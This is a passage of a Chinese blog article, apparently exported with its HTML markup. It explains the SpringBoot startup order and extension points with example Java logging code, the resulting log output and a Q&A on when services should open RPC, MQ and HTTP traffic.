class=\"line\">   public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanFactoryPostProcessor postProcessBeanFactory &quot;);  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行以上代码后，可以在日志中看到启动顺序！</p>\n<h4 id=\"实际的执行顺序\"><a href=\"#实际的执行顺序\" class=\"headerlink\" title=\"实际的执行顺序\"></a>实际的执行顺序</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2023-11-25 18:10:53,748 [main] ERROR (TestSpringOrder3:37) - 启动顺序:BeanFactoryPostProcessor postProcessBeanFactory   </span><br><span class=\"line\">2023-11-25 18:10:59,299 [main] ERROR (TestSpringOrder:53) - 启动顺序:构造函数 TestSpringOrder  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:127) - 启动顺序: Autowired  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:129) - 启动顺序:setBeanName  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:111) - 启动顺序:setBeanFactory  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:121) - 启动顺序:setApplicationContext  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder3:25) - 启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:testSpringOrder  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:63) - 启动顺序:post-construct  </span><br><span class=\"line\">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:116) - 启动顺序:afterPropertiesSet  </span><br><span class=\"line\">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:46) - 启动顺序:init-method  </span><br><span class=\"line\">2023-11-25 18:10:59,320 [main] ERROR (TestSpringOrder3:31) - 启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:testSpringOrder  </span><br><span class=\"line\">2023-11-25 18:17:21,563 [main] ERROR (SpringOrderConfiguartion:21) - 启动顺序: @Bean 注解方法执行  </span><br><span class=\"line\">2023-11-25 18:17:21,668 [main] ERROR (TestSpringOrder:58) - 启动顺序:SmartInitializingSingleton  </span><br><span class=\"line\">2023-11-25 18:17:21,675 [main] ERROR (TestSpringOrder:74) - 启动顺序:start  </span><br><span class=\"line\">2023-11-25 18:17:23,508 [main] ERROR (TestSpringOrder:68) - 启动顺序:ContextRefreshedEvent  </span><br><span class=\"line\">2023-11-25 18:17:23,574 [main] ERROR (TestSpringOrder:79) - 启动顺序:CommandLineRunner  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我通过在以上扩展点 添加 debug 断点，调试代码，整理出 Spring启动原理的 长图。过程省略…………</p>\n<h2 id=\"一张长图透彻解释-Spring启动顺序-1\"><a href=\"#一张长图透彻解释-Spring启动顺序-1\" class=\"headerlink\" title=\"一张长图透彻解释 Spring启动顺序\"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/2.png\"></p>\n<h4 id=\"实例化和初始化的区别\"><a href=\"#实例化和初始化的区别\" class=\"headerlink\" title=\"实例化和初始化的区别\"></a>实例化和初始化的区别</h4><p><code>new TestSpringOrder()</code>：new 创建对象实例，即为实例化一个对象；执行该Bean的 <code>init-method</code> 等方法 为初始化一个Bean。注意初始化和实例化的区别。</p>\n<h2 id=\"Spring-重要扩展点的启动顺序\"><a href=\"#Spring-重要扩展点的启动顺序\" class=\"headerlink\" title=\"Spring 重要扩展点的启动顺序\"></a>Spring 重要扩展点的启动顺序</h2><p><strong>1.BeanFactoryPostProcessor</strong></p>\n<p>BeanFactory初始化之后，所有的Bean定义已经被加载，但Bean实例还没被创建（不包括<code>BeanFactoryPostProcessor</code>类型）。Spring IoC容器允许<code>BeanFactoryPostProcessor</code>读取配置元数据，修改bean的定义，Bean的属性值等。</p>\n<p><strong>2.实例化Bean</strong></p>\n<p>Spring 调用java反射API 实例化 Bean。等同于 <code>new TestSpringOrder()</code>;</p>\n<p><strong>3.Autowired 装配依赖</strong></p>\n<p>Autowired是 借助于 <code>AutowiredAnnotationBeanPostProcessor</code> 解析 Bean 的依赖，装配依赖。如果被依赖的Bean还未初始化，则先初始化 被依赖的Bean。在 Bean实例化完成后，Spring将首先装配Bean依赖的属性。</p>\n<p><strong>4.BeanNameAware</strong></p>\n<p><code>setBeanName</code></p>\n<p><strong>5.BeanFactoryAware</strong></p>\n<p><code>setBeanFactory</code></p>\n<p><strong>6.ApplicationContextAware setApplicationContext</strong></p>\n<p>在Bean实例化前，会率先设置Aware接口，例如 <code>BeanNameAware</code> <code>BeanFactoryAware</code> <code>ApplicationContextAware</code> 等</p>\n<p><strong>7.BeanPostProcessor postProcessBeforeInitialization</strong></p>\n<p>如果我想在 bean初始化方法前后要添加一些自己逻辑处理。可以提供 <code>BeanPostProcessor</code>接口实现类，然后注册到Spring IoC容器中。在此接口中，可以创建Bean的代理，甚至替换这个Bean。</p>\n<p><strong>8.PostConstruct 执行</strong></p>\n<p>接下来Spring会依次调用 Bean实例初始化的 三大方法。</p>\n<p><strong>9.InitializingBean</strong></p>\n<p><code>afterPropertiesSet</code></p>\n<p><strong>10.init-method</strong></p>\n<p>方法执行</p>\n<p><strong>11.BeanPostProcessor postProcessAfterInitialization</strong></p>\n<p>在Spring 对Bean的初始化方法执行完成后，执行该方法</p>\n<p><strong>12.其他Bean 实例化和初始化</strong></p>\n<p>Spring 会循环初始化Bean。直至所有的单例Bean都完成初始化</p>\n<p><strong>13.所有单例Bean 初始化完成后</strong></p>\n<p><strong>14.SmartInitializingSingleton Bean实例化后置处理</strong></p>\n<p>该接口的执行时机在 所有的单例Bean执行完成后。例如Spring 事件订阅机制的 <code>EventListener</code>注解，所有的订阅者 都是 在这个位置被注册进 Spring的。而在此之前，Spring Event订阅机制还未初始化完成。所以如果有 MQ、Rpc 入口流量在此之前开启，Spring Event就可能出问题！</p>\n<blockquote>\n<p>所以强烈建议 Http、MQ、Rpc 入口流量在 <code>SmartInitializingSingleton</code> 之后开启流量。</p>\n</blockquote>\n<p>Http、MQ、Rpc 入口流量必须在 <code>SmartInitializingSingleton</code> 之后开启流量。</p>\n<p><strong>15.Spring 提供的扩展点，在所有单例Bean的 EventListener等组件全部启动完成后，即Spring启动完成，则执行 start 方法。在这个位置适合开启入口流量！</strong></p>\n<p>Http、MQ、Rpc 入口流量适合 在 <code>SmartLifecyle</code> 中开启</p>\n<p><strong>16.发布 ContextRefreshedEvent 方法</strong></p>\n<p>该事件会执行多次，在 <code>Spring Refresh</code> 执行完成后，就会发布该事件！</p>\n<p><strong>17.注册和初始化 Spring MVC</strong></p>\n<p>SpringBoot 应用，在父级 Spring启动完成后，会尝试启动 内嵌式 tomcat容器。在此之前，SpringBoot会初始化 SpringMVC 和注册<code>DispatcherServlet</code>到Web容器。</p>\n<p><strong>18.Tomcat&#x2F;Jetty 容器开启端口</strong></p>\n<p>SpringBoot 调用内嵌式容器，会开启并监听端口，此时Http流量就开启了。</p>\n<p><strong>19.应用启动完成后，执行 CommandLineRunner</strong></p>\n<p>SpringBoot 特有的机制，待所有的完全执行完成后，会执行该接口 run方法。值得一提的是，由于此时Http流量已经开启，如果此时进行本地缓存初始化、预热缓存等，稍微有些晚了！在这个间隔期，可能缓存还未就绪！</p>\n<p>所以预热缓存的时机应该发生在 入口流量开启之前，比较合适的机会是在 Bean初始化的阶段。虽然 在Bean初始化时 Spring尚未完成启动，但是调用 Bean预热缓存也是可以的。但是注意：不要在 Bean初始化时 使用 Spring Event，因为它还未完成初始化 。</p>\n<h2 id=\"回答-关于-Spring-启动原理的若干问题\"><a href=\"#回答-关于-Spring-启动原理的若干问题\" class=\"headerlink\" title=\"回答 关于 Spring 启动原理的若干问题\"></a>回答 关于 Spring 启动原理的若干问题</h2><p><strong>1.init-method、PostConstruct、afterPropertiesSet 三个方法的执行顺序。</strong></p>\n<p>回答：<code>PostConstruct</code>，<code>afterPropertiesSet</code>，<code>init-method</code></p>\n<p><strong>2.有两个 Bean声明了初始化方法。A使用 PostConstruct注解声明，B使用 init-method 声明。Spring一定先执行 A 的PostConstruct 方法吗？</strong></p>\n<p>回答：Spring 会循环初始化Bean实例，初始化完成1个Bean，再初始化下一个Bean。Spring并没有使用这种机制启动，即所有的Bean先执行 <code>PostConstruct</code>，再统一执行<code>afterProperfiesSet</code>。</p>\n<p>此外，A、B两个Bean的初始化顺序不确定，谁先谁后不确定。无法保证 A 的<code>PostConstruct</code> 一定先执行。除非使用 Order注解，声明Bean的初始化顺序！</p>\n<p><strong>3.Spring 何时装配Autowire属性，PostConstruct方法中引用 Autowired 字段是否会空指针?</strong></p>\n<p>Autowired装配依赖发生在 <code>PostConstruct</code>之前，不会出现空指针！</p>\n<p><strong>4.PostConstruct 中方法依赖ApplicationContextAware拿到 ApplicationContext，两者的顺序谁先谁后？是否会出现空指针!</strong></p>\n<p><code>ApplicationContextAware</code> 会先执行，不会出现空指针！但是当Autowired没有找到对应的依赖，并且声明了非强制依赖时，该字段会为空，有潜在 空指针风险。</p>\n<p><strong>5.项目应该如何监听 Spring 的启动就绪事件。</strong></p>\n<p>通过<code>SmartLifecyle start</code>方法，监听Spring就绪 。适合在此开启入口流量！</p>\n<p><strong>6.项目如何监听Spring 刷新事件。</strong></p>\n<p>监听<code>Spring Event ContextRefreshedEvent</code></p>\n<p><strong>7.Spring就绪事件和刷新事件的执行顺序和区别。</strong></p>\n<p>Spring就绪事件会先于 刷新事件。两者都可能多次执行，要确保方法的幂等处理，避免重复注册问题</p>\n<p><strong>8.Http 流量入口何时启动完成。</strong></p>\n<p>SpringBoot 最后阶段，启动完成Spring 上下文，才开启Http入口流量，此时 SmartLifecycle#start 已执行。所有单例Bean和SpringEvent等组件都已经就绪！</p>\n<p><strong>9.项目中在 init-method 方法中注册 Rpc是否合理？什么是合理的时机？</strong></p>\n<p>init 开启Rpc流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p>\n<p><strong>10.项目中在 init-method 方法中注册 MQ消费组是否合理？什么是合理的时机？</strong></p>\n<p>init 开启 MQ 流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p>\n<p><strong>11.Spring还未完全启动，在 PostConstruct 中调用 getBeanByAnnotation能否获得准确的结果？</strong></p>\n<p>虽然未启动完成，但是Spring执行该<code>getBeanByAnnotation</code>方法时，会率先检查 Bean定义，如果Bean定义对应的 Bean尚未初始化，则初始化这些Bean。所以即便是Spring初始化过程中调用，调用结果是准确的。</p>\n<h2 id=\"源码级别介绍\"><a href=\"#源码级别介绍\" class=\"headerlink\" title=\"源码级别介绍\"></a>源码级别介绍</h2><h4 id=\"SmartInitializingSingleton-接口的执行位置\"><a href=\"#SmartInitializingSingleton-接口的执行位置\" class=\"headerlink\" title=\"SmartInitializingSingleton 接口的执行位置\"></a>SmartInitializingSingleton 接口的执行位置</h4><p>下图代码说明了，Spring在初始化全部 单例Bean以后，会执行 <code>SmartInitializingSingleton</code> 接口。</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/3.png\"></p>\n<h4 id=\"Autowired-何时装配Bean的依赖\"><a href=\"#Autowired-何时装配Bean的依赖\" class=\"headerlink\" title=\"Autowired 何时装配Bean的依赖\"></a>Autowired 何时装配Bean的依赖</h4><p>在Bean实例化之后，但初始化之前，<code>AutowiredAnnotationBeanPostProcessor</code> 会注入Autowired字段。</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/4.png\"></p>\n<h4 id=\"SpringBoot-何时开启Http端口\"><a href=\"#SpringBoot-何时开启Http端口\" class=\"headerlink\" title=\"SpringBoot 何时开启Http端口\"></a>SpringBoot 何时开启Http端口</h4><p>下图代码中可以看到，SpringBoot会首先启动 Spring上下文，完成后才启动 嵌入式Web容器，初始化SpringMVC，监听端口</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/5.png\"></p>\n<h4 id=\"Spring-初始化Bean的关键代码\"><a href=\"#Spring-初始化Bean的关键代码\" class=\"headerlink\" title=\"Spring 初始化Bean的关键代码\"></a>Spring 初始化Bean的关键代码</h4><p>下图我加了注释，Spring初始化Bean的关键代码，全在 这个方法里，感兴趣的可以自行查阅代码 。</p>\n<p>AbstractAutowireCapableBeanFactory#initializeBean</p>\n<p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/6.png\"></p>\n<h4 id=\"Spring-CommandLineRunner-执行位置\"><a href=\"#Spring-CommandLineRunner-执行位置\" class=\"headerlink\" title=\"Spring CommandLineRunner 执行位置\"></a>Spring CommandLineRunner 执行位置</h4><p>Spring Boot外部，当启动完Spring上下文以后，最后才启动 <code>CommandLineRunner</code>。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/7.png\"><br>总结</h2><p>SpringBoot 会在Spring完全启动完成后，才开启Http流量。这给了我们启示：应该在Spring启动完成后开启入口流量。Rpc和 MQ流量 也应该如此，所以建议大家 在 <code>SmartLifecype</code> 或者 <code>ContextRefreshedEvent</code> 等位置 注册服务，开启流量。</p>\n<p>例如Spring Cloud Eureka 服务发现组件，就是在 <code>SmartLifecype</code>中注册服务的！</p>\n<p>整理10 个小时写完本篇文章，希望大家有所收获。</p>\n","cover":"/img/liushui.png","cover_type":"img","excerpt":"","more":"<p>虽然Java程序员大部分工作都是CRUD，但是工作中常用的中间件必须和Spring集成，如果不知道Spring的原理，很难理解这些中间件和框架的原理。</p>\n<h2 id=\"一张长图透彻解释-Spring启动顺序\"><a href=\"#一张长图透彻解释-Spring启动顺序\" class=\"headerlink\" title=\"一张长图透彻解释 Spring启动顺序\"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/1.png\"></p>\n<h2 id=\"测试对Spring启动原理的理解程度\"><a href=\"#测试对Spring启动原理的理解程度\" class=\"headerlink\" title=\"测试对Spring启动原理的理解程度\"></a>测试对Spring启动原理的理解程度</h2><p>我举个例子，测试一下，你对Spring启动原理的理解程度。</p>\n<ul>\n<li><p>Rpc框架和Spring的集成问题。Rpc框架何时注册暴露服务，在哪个Spring扩展点注册呢？init-method 中行不行？</p>\n</li>\n<li><p>MQ 消费组和Spring的集成问题。MQ消费者何时开始消费，在哪个Spring扩展点”注册“自己？init-method 中行不行？</p>\n</li>\n<li><p>SpringBoot 集成Tomcat问题。如果出现已开启Http流量，Spring还未启动完成，怎么办？Tomcat何时开启端口，对外服务？</p>\n</li>\n</ul>\n<p>SpringBoot项目常见的流量入口无外乎 Rpc、Http、MQ 三种方式。一名合格的架构师必须精通服务的入口流量何时开启，如何正确开启？最近我遇到的两次线上故障都和Spring启动过程相关。</p>\n<p>故障的具体表现是：Kafka消费组已经开始消费，已开启流量，然而Spring 还未启动完成。因为业务代码中使用的Spring Event事件订阅组件还未启动（订阅者还未注册到Spring），所以处理异常，出了线上故障。根本原因是————项目在错误的时机开启 MQ 流量，然而Spring还未启动完成，导致出现故障。</p>\n<p>正确的做法是：项目在Spring启动完成后开启入口流量，然而我司的Kafka消费组 在Spring <code>init-method bean</code> 实例化阶段就开启了流量，导致故障发生。出现这样的问题，说明项目初期的程序员没有深入理解Spring的启动原理。</p>\n<p>接下来，我再次抛出 11 个问题，说明这个问题————深入理解Spring启动原理的重要性。</p>\n<p><strong>1、</strong> Spring还未完全启动，在<code>PostConstruct</code>中调用<code>getBeanByAnnotation</code>能否获得准确的结果？；<br><strong>2、</strong> 项目应该如何监听Spring的启动就绪事件？；<br><strong>3、</strong> 项目如何监听Spring刷新事件？；<br><strong>4、</strong> Spring就绪事件和刷新事件的执行顺序和区别？；<br><strong>5、</strong> Http流量入口何时启动完成？；<br><strong>6、</strong> 项目中在<code>init-method</code>方法中注册Rpc是否合理？什么是合理的时机？；<br><strong>7、</strong> 项目中在<code>init-method</code>方法中注册MQ消费组是否合理？什么是合理的时机？；<br><strong>8、</strong> <code>PostConstruct</code>中方法依赖<code>ApplicationContextAware</code>拿到<code>ApplicationContext</code>，两者的顺序谁先谁后？是否会出现空指针!；<br><strong>9、</strong> <code>init-method</code>、<code>PostConstruct</code>、<code>afterPropertiesSet</code>三个方法的执行顺序?；<br><strong>10、</strong> 有两个Bean声明了初始化方法A使用<code>PostConstruct</code>注解声明，B使用<code>init-method</code>声明Spring一定先执行A的<code>PostConstruct</code>方法吗？；<br><strong>11、</strong> Spring何时装配Autowire属性，<code>PostConstruct</code>方法中引用Autowired字段什么场景会空指针?；</p>\n<p>精通Spring 启动原理，以上问题则迎刃而解。接下来，大家一起学习Spring的启动原理，看看Spring的扩展点分别在何时执行。</p>\n<h2 id=\"一起数数-Spring启动过程的扩展点有几个？\"><a href=\"#一起数数-Spring启动过程的扩展点有几个？\" class=\"headerlink\" title=\"一起数数 Spring启动过程的扩展点有几个？\"></a>一起数数 Spring启动过程的扩展点有几个？</h2><p>Spring的扩展点极多，这里为了讲清楚启动原理，所以只列举和启动过程有关的扩展点。</p>\n<p><strong>1、</strong> <code>BeanFactoryAware</code>可在Bean中获取<code>BeanFactory</code>实例；<br><strong>2、</strong> <code>ApplicationContextAware</code>可在Bean中获取<code>ApplicationContext</code>实例；<br><strong>3、</strong> <code>BeanNameAware</code>可以在Bean中得到它在IOC容器中的Bean的实例的名字；<br><strong>4、</strong> <code>ApplicationListener</code>可监听<code>ContextRefreshedEvent</code>等；<br><strong>5、</strong> <code>CommandLineRunner</code>整个项目启动完毕后，自动执行；<br>6.  SmartLifecycle#start 在Spring Bean实例化完成后，执行start 方法。<strong>7、</strong> 使用<code>@PostConstruct</code>注解，用于Bean实例初始化；<br><strong>8、</strong> 实现<code>InitializingBean</code>接口，用于Bean实例初始化；<br><strong>9、</strong> xml中声明<code>init-method</code>方法，用于Bean实例初始化；<br><strong>10、</strong> <code>Configuration</code>配置类通过@Bean注解注册Bean到Spring；<br><strong>11、</strong> <code>BeanPostProcessor</code>在Bean的初始化前后，植入扩展点！；<br><strong>12、</strong> <code>BeanFactoryPostProcessor</code>在<code>BeanFactory</code>创建后植入扩展点！；</p>\n<h2 id=\"通过打印日志学习Spring的执行顺序\"><a href=\"#通过打印日志学习Spring的执行顺序\" class=\"headerlink\" title=\"通过打印日志学习Spring的执行顺序\"></a>通过打印日志学习Spring的执行顺序</h2><p>首先我们先通过 代码实验，验证一下以上扩展点的执行顺序。</p>\n<p><strong>1、</strong> 声明<code>TestSpringOrder</code>分别继承以下接口，并且在接口方法实现中，日志打印该接口的名称；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public class TestSpringOrder implements  </span><br><span class=\"line\">      ApplicationContextAware,  </span><br><span class=\"line\">      BeanFactoryAware,   </span><br><span class=\"line\">      InitializingBean,   </span><br><span class=\"line\">      SmartLifecycle,   </span><br><span class=\"line\">      BeanNameAware,   </span><br><span class=\"line\">      ApplicationListener&lt;ContextRefreshedEvent&gt;,   </span><br><span class=\"line\">      CommandLineRunner,  </span><br><span class=\"line\">      SmartInitializingSingleton &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@Override  </span><br><span class=\"line\">public void afterPropertiesSet() throws Exception &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:afterPropertiesSet&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">@Override  </span><br><span class=\"line\">public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:setApplicationContext&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>2、</strong> <code>TestSpringOrder</code>使用<code>PostConstruct</code>注解初始化，声明<code>init-method</code>方法初始化；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">@PostConstruct  </span><br><span class=\"line\">public void postConstruct() &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:post-construct&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">public void initMethod() &#123;  </span><br><span class=\"line\">   log.error(&quot;启动顺序:init-method&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>3、</strong> 新建<code>TestSpringOrder2</code>继承；</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">public class TestSpringOrder3 implements  </span><br><span class=\"line\">         BeanPostProcessor,   </span><br><span class=\"line\">         BeanFactoryPostProcessor &#123;  </span><br><span class=\"line\">   @Override  </span><br><span class=\"line\">   public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class=\"line\">      return bean;  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">   @Override  </span><br><span class=\"line\">   public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class=\"line\">      return bean;  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">   @Override  </span><br><span class=\"line\">   public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException &#123;  </span><br><span class=\"line\">      log.error(&quot;启动顺序:BeanFactoryPostProcessor postProcessBeanFactory &quot;);  </span><br><span class=\"line\">   &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>执行以上代码后，可以在日志中看到启动顺序！</p>\n<h4 id=\"实际的执行顺序\"><a href=\"#实际的执行顺序\" class=\"headerlink\" title=\"实际的执行顺序\"></a>实际的执行顺序</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2023-11-25 18:10:53,748 [main] ERROR (TestSpringOrder3:37) - 启动顺序:BeanFactoryPostProcessor postProcessBeanFactory   </span><br><span class=\"line\">2023-11-25 18:10:59,299 [main] ERROR (TestSpringOrder:53) - 启动顺序:构造函数 TestSpringOrder  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:127) - 启动顺序: Autowired  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:129) - 启动顺序:setBeanName  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:111) - 启动顺序:setBeanFactory  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:121) - 启动顺序:setApplicationContext  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder3:25) - 启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:testSpringOrder  </span><br><span class=\"line\">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:63) - 启动顺序:post-construct  </span><br><span class=\"line\">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:116) - 启动顺序:afterPropertiesSet  </span><br><span class=\"line\">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:46) - 启动顺序:init-method  </span><br><span class=\"line\">2023-11-25 18:10:59,320 [main] ERROR (TestSpringOrder3:31) - 启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:testSpringOrder  </span><br><span class=\"line\">2023-11-25 18:17:21,563 [main] ERROR (SpringOrderConfiguartion:21) - 启动顺序: @Bean 注解方法执行  </span><br><span class=\"line\">2023-11-25 18:17:21,668 [main] ERROR (TestSpringOrder:58) - 启动顺序:SmartInitializingSingleton  </span><br><span class=\"line\">2023-11-25 18:17:21,675 [main] ERROR (TestSpringOrder:74) - 启动顺序:start  </span><br><span class=\"line\">2023-11-25 18:17:23,508 [main] ERROR (TestSpringOrder:68) - 启动顺序:ContextRefreshedEvent  </span><br><span class=\"line\">2023-11-25 18:17:23,574 [main] ERROR (TestSpringOrder:79) - 启动顺序:CommandLineRunner  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我通过在以上扩展点 添加 debug 断点，调试代码，整理出 Spring启动原理的 长图。过程省略…………</p>\n<h2 id=\"一张长图透彻解释-Spring启动顺序-1\"><a href=\"#一张长图透彻解释-Spring启动顺序-1\" class=\"headerlink\" title=\"一张长图透彻解释 Spring启动顺序\"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src=\"/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/2.png\"></p>\n<h4 id=\"实例化和初始化的区别\"><a href=\"#实例化和初始化的区别\" class=\"headerlink\" title=\"实例化和初始化的区别\"></a>实例化和初始化的区别</h4><p><code>new TestSpringOrder()</code>：new 创建对象实例，即为实例化一个对象；执行该Bean的 <code>init-method</code> 等方法 为初始化一个Bean。注意初始化和实例化的区别。</p>\n<h2 id=\"Spring-重要扩展点的启动顺序\"><a href=\"#Spring-重要扩展点的启动顺序\" class=\"headerlink\" title=\"Spring 重要扩展点的启动顺序\"></a>Spring 重要扩展点的启动顺序</h2><p><strong>1.BeanFactoryPostProcessor</strong></p>\n<p>BeanFactory初始化之后，所有的Bean定义已经被加载，但Bean实例还没被创建（不包括<code>BeanFactoryPostProcessor</code>类型）。Spring IoC容器允许<code>BeanFactoryPostProcessor</code>读取配置元数据，修改bean的定义，Bean的属性值等。</p>\n<p><strong>2.实例化Bean</strong></p>\n<p>Spring 调用java反射API 实例化 Bean。等同于 <code>new TestSpringOrder()</code>;</p>\n<p><strong>3.Autowired 装配依赖</strong></p>\n<p>Autowired是 借助于 <code>AutowiredAnnotationBeanPostProcessor</code> 解析 Bean 的依赖，装配依赖。如果被依赖的Bean还未初始化，则先初始化 被依赖的Bean。在 Bean实例化完成后，Spring将首先装配Bean依赖的属性。</p>\n<p><strong>4.BeanNameAware</strong></p>\n<p><code>setBeanName</code></p>\n<p><strong>5.BeanFactoryAware</strong></p>\n<p><code>setBeanFactory</code></p>\n<p><strong>6.ApplicationContextAware setApplicationContext</strong></p>\n<p>在Bean实例化前，会率先设置Aware接口，例如 <code>BeanNameAware</code> <code>BeanFactoryAware</code> <code>ApplicationContextAware</code> 等</p>\n<p><strong>7.BeanPostProcessor postProcessBeforeInitialization</strong></p>\n<p>如果我想在 bean初始化方法前后要添加一些自己逻辑处理。可以提供 <code>BeanPostProcessor</code>接口实现类，然后注册到Spring IoC容器中。在此接口中，可以创建Bean的代理，甚至替换这个Bean。</p>\n<p><strong>8.PostConstruct 执行</strong></p>\n<p>接下来Spring会依次调用 Bean实例初始化的 三大方法。</p>\n<p><strong>9.InitializingBean</strong></p>\n<p><code>afterPropertiesSet</code></p>\n<p><strong>10.init-method</strong></p>\n<p>方法执行</p>\n<p><strong>11.BeanPostProcessor postProcessAfterInitialization</strong></p>\n<p>在Spring 对Bean的初始化方法执行完成后，执行该方法</p>\n<p><strong>12.其他Bean 实例化和初始化</strong></p>\n<p>Spring 会循环初始化Bean。直至所有的单例Bean都完成初始化</p>\n<p><strong>13.所有单例Bean 初始化完成后</strong></p>\n<p><strong>14.SmartInitializingSingleton Bean实例化后置处理</strong></p>\n<p>该接口的执行时机在 所有的单例Bean执行完成后。例如Spring 事件订阅机制的 <code>EventListener</code>注解，所有的订阅者 都是 在这个位置被注册进 Spring的。而在此之前，Spring Event订阅机制还未初始化完成。所以如果有 MQ、Rpc 入口流量在此之前开启，Spring Event就可能出问题！</p>\n<blockquote>\n<p>所以强烈建议 Http、MQ、Rpc 入口流量在 <code>SmartInitializingSingleton</code> 